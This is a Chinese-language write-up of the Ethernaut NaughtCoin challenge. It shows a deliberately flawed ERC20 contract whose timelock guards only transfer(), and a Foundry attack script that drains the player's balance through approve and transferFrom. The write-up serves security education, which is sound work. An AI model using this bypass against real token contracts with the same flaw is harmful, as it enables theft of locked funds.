# Ethernaut CTF Writeup

## Level 15 NaughtCoin

> 題目: https://ethernaut.openzeppelin.com/level/0x65Ff7C338fE34CC5C0F0cc97D3FA1B2681e39976

原始碼:
```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "openzeppelin-contracts-08/token/ERC20/ERC20.sol";

contract NaughtCoin is ERC20 {
    // string public constant name = 'NaughtCoin';
    // string public constant symbol = '0x0';
    // uint public constant decimals = 18;
    uint256 public timeLock = block.timestamp + 10 * 365 days;
    uint256 public INITIAL_SUPPLY;
    address public player;

    constructor(address _player) ERC20("NaughtCoin", "0x0") {
        player = _player;
        INITIAL_SUPPLY = 1000000 * (10 ** uint256(decimals()));
        // _totalSupply = INITIAL_SUPPLY;
        // _balances[player] = INITIAL_SUPPLY;
        _mint(player, INITIAL_SUPPLY);
        emit Transfer(address(0), player, INITIAL_SUPPLY);
    }

    function transfer(address _to, uint256 _value) public override lockTokens returns (bool) {
        super.transfer(_to, _value);
    }

    // Prevent the initial owner from transferring tokens until the timelock has passed
    modifier lockTokens() {
        if (msg.sender == player) {
            require(block.timestamp > timeLock);
            _;
        } else {
            _;
        }
    }
}
```

過關條件: 

- NaughtCoin 是一種 ERC20 代幣，而且你已經持有這些代幣。問題是你只能在等待 10 年的鎖倉期之後才能轉移它們。你能不能嘗試將它們轉移到另一個地址，讓你可以自由地使用它們嗎？要完成這個關卡的話要讓你的帳戶餘額歸零。

解法：

- 要繞過這個時間鎖定，我們可以利用 ERC20 合約的其他函數，例如 `approve` 和 `transferFrom`，這些函數不會觸發時間鎖定檢查
    - `approve` 函數： `player` 可以授權另一個地址（例如我們控制的合約或帳戶）在時間鎖定內代為轉移代幣。
    - `transferFrom` 函數： 透過授權的地址來調用 `transferFrom` 函數，轉移 `player` 的代幣。

```
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Script.sol";
import {NaughtCoin} from "../src/level15/NaughtCoin.sol";

contract Attack is Script {
    NaughtCoin target = NaughtCoin(0xC37c8d456FD92a2886a25cC8824D8B0ba5a10c8F);
    function run() public {
        vm.startBroadcast();

        address myWallet = 0x7617....A898;
        uint myBalance = target.balanceOf(myWallet);
        console.log("Current balance is: ", myBalance);
        target.approve(myWallet, myBalance);
        target.transferFrom(myWallet, address(target), myBalance);
        console.log("New balance is: ", target.balanceOf(myWallet));

        vm.stopBroadcast();
    }
}

```